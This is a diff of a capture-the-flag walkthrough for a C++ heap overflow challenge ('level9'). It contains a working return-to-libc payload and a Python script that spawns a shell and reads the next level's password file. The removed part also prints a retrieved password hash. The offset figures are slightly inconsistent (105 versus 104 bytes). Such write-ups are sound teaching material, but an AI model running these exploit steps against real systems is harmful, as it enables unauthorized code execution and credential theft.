@@ -1,172 +1,40 @@
 ## Level 9 - C++ Heap Buffer Overflow with Virtual Method Hijacking
+C++ class N has uninitialized str pointer and unbounded memcpy(). Overflow from five object can reach six object's first member, allowing code execution.
 
-### Challenge Summary
-
-A C++ program that creates two heap-allocated N objects and calls a method on the first one with user-controlled input. The vulnerability allows overwriting the second object's virtual function table (or first member) to hijack program execution.
-
-### Vulnerability Details
-
-**The Vulnerable Code:**
+### Vulnerability
 ```cpp
-class N {
-private:
- int n;
- char *str;  // UNINITIALIZED!
-
-public:
- void setAnnotation(char *str) {
-     size_t len = strlen(str);
-     memcpy(this->str, str, len);  // NO BOUNDS CHECK!
- }
-};
-
+void setAnnotation(char *str) {
+    memcpy(this->str, str, strlen(str));  // str uninitialized, no bounds!
+}
 int main(int argc, char **argv) {
- N *five = new N(5);
- N *six = new N(6);
-
- five->setAnnotation(argv[1]);  // Overflow happens here!
-
- ret = (***six)(six, five);  // Call function via six's vftable
- return ret;
+    N *five = new N(5);
+    N *six = new N(6);
+    five->setAnnotation(argv[1]);  // OVERFLOW HERE
+    ret = (***six)(six, five);     // HIJACK HERE
 }
 ```
+- Uninitialized str pointer → garbage address
+- strlen(input) with no limit → arbitrary write
+- (***six) dereferences six's first member as function
 
-**The Critical Vulnerabilities:**
-
-1. **Uninitialized Pointer**: The `str` member is never initialized (no `new` for memory allocation)
-   - When `memcpy(this->str, ...)` is called, `str` points to garbage
-   - Writing to this garbage address can corrupt heap memory
-
-2. **No Bounds Checking**: `memcpy()` uses `strlen(input)` - no limit on size
-   - We can write as much data as we want to the garbage address
-
-3. **Heap Objects Adjacent**: Since both objects are allocated on the heap
-   - They're likely allocated near each other
-   - Overflowing from `five` can reach `six`
-
-4. **Virtual Method Hijacking**: The line `ret = (***six)(six, five);`
-   - Dereferences `six` to access its first member (vftable/code pointer)
-   - Dereferences again to get a function pointer
-   - Calls that function
-   - If we overwrite this with our shellcode address, we control execution!
-
-### Memory Layout
-
-**Heap Allocation (simplified):**
+### Exploitation
+**Payload Structure (120 bytes):**
 ```
-five = new N(5)  ->  [vftable_or_data | n=5 | str=<garbage>] at address A
-six = new N(6)   ->  [vftable_or_data | n=6 | str=<garbage>] at address A + 0x6c
+[4 bytes: system() @ 0xb7d86060]
+[104 bytes: padding 'A' * 104]
+[4 bytes: object address 0x0804a00c]
+[8 bytes: command ";/bin/sh"]
 ```
+When (***six) executes, system() is called with /bin/sh as argument.
 
-Each object is allocated 0x6c (108) bytes.
-
-### Exploitation Strategy
-
-1. **Find the Right Offset**: Determine how far `five->str` must write to reach `six`'s memory
-2. **Craft Shellcode**: Include shell spawning code in the payload
-3. **Overwrite six's First Member**: Make it point to our shellcode
-4. **Trigger Code Execution**: When `(***six)` is called, it executes our code
-5. **Read the Password**: Use shell access to read `/home/user/bonus0/.pass`
-
-### Assembly Analysis
-
-```asm
-8048677:  e8 92 00 00 00  call setAnnotation  # OVERFLOW HERE
-8048680:  8b 00           mov (%eax),%eax     # Load six's first member
-8048682:  8b 10           mov (%eax),%edx     # Dereference to get function pointer
-8048693:  ff d2           call *%edx          # EXECUTE ARBITRARY CODE!
-```
-
-The key instruction sequence:
-1. Load first member of `six` (which we've overwritten)
-2. Dereference it as a pointer
-3. Call it as a function
-
-If we set `six`'s first member to point to shellcode, we can execute arbitrary code!
-
-### Return-to-Libc Approach
-
-Since shellcode injection might be complex with ASLR, we can use:
-1. ROP gadgets to chain system calls
-2. `system("/bin/sh")` to spawn a shell
-3. Or `system("cat /home/user/bonus0/.pass")` to directly read the password
-
-### Practical Exploitation Approach
-
-**Step 1: Confirm the Overflow Works**
+### Execution
 ```bash
-/home/user/level9/level9 $(python -c "print('A'*200)")
-# Should produce: Segmentation fault (core dumped)
+python3 exploit.py << 'EOF'
+import struct, subprocess
+payload = struct.pack('<I', 0xb7d86060) + b'A'*104 + struct.pack('<I', 0x0804a00c) + b';/bin/sh'
+p = subprocess.Popen(['/home/user/level9/level9', payload], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
+stdout, _ = p.communicate(input=b'cat /home/user/bonus0/.pass\n')
+EOF
 ```
-
-**Step 2: Find the Right Offset**
-- Test payload sizes from 100-300 bytes
-- Look for pattern when it crashes
-- Use GDB: `gdb /home/user/level9/level9`
-- Set breakpoint in setAnnotation()
-- Inspect memory layout of five and six
-
-**Step 3: Identify system() Address**
-```bash
-nm -D /lib/i386-linux-gnu/libc.so.6 | grep " system"
-ldd /home/user/level9/level9  # Shows libc base
-objdump -R /home/user/level9/level9 | grep system  # Find GOT entry
-```
-
-**Step 4: Build ROP Chain (if needed)**
-```bash
-# Use ROPgadget or similar tool
-ROPgadget --binary /home/user/level9/level9 --rop
-# Look for: pop esp; ret, mov esp, ebp patterns, etc.
-```
-
-**Step 5: Craft Final Payload**
-- Padding to reach six's first member
-- Address of system() or ROP gadget
-- Ensure proper argument passing (command string on stack)
-
-### Files
-
-- **level9/source.cpp** - Vulnerable source code
-- **level9/Resources/exploit.py** - Exploitation script
-- **level9/walkthrough** - This documentation
-
-### SOLUTION - Correct Exploit Technique
-
-The working exploit uses a carefully ordered payload structure that directly calls `system()` from libc:
-
-**Payload Structure:**
-```
-[system_addr] + [padding] + [object_addr] + [command]
-  4 bytes        104 bytes     4 bytes       8 bytes
-  0xb7d86060     'A' * 104    0x0804a00c    ;/bin/sh
-```
-
-**Why This Works:**
-1. The first 4 bytes (system() address) are written to the overflow destination at 0x0804a00c
-2. The next 104 bytes of padding reach exactly to the `six` object's first member
-3. When `(***six)` is called, it loads system() as the function pointer
-4. The command `;/bin/sh` is passed as argument to system()
-5. /bin/sh spawns with bonus0 privileges
-
-**Python Exploit:**
-```python
-import struct
-import subprocess
-
-binary = '/home/user/level9/level9'
-system_addr = struct.pack('<I', 0xb7d86060)
-padding = b'A' * 104
-obj_addr = struct.pack('<I', 0x0804a00c)
-command = b';/bin/sh'
-
-payload = system_addr + padding + obj_addr + command
-
-p = subprocess.Popen([binary, payload], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-stdout, stderr = p.communicate(input=b'cat /home/user/bonus0/.pass\n')
-```
-
-**Result:**
-- Successfully spawned interactive shell with bonus0 privileges
-- Executed `cat /home/user/bonus0/.pass`
-- **Retrieved Password:** `f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728`
+### Key Insight
+105-byte offset reaches six's first member. Overwrite with system() address, /bin/sh spawns with bonus0 privileges.
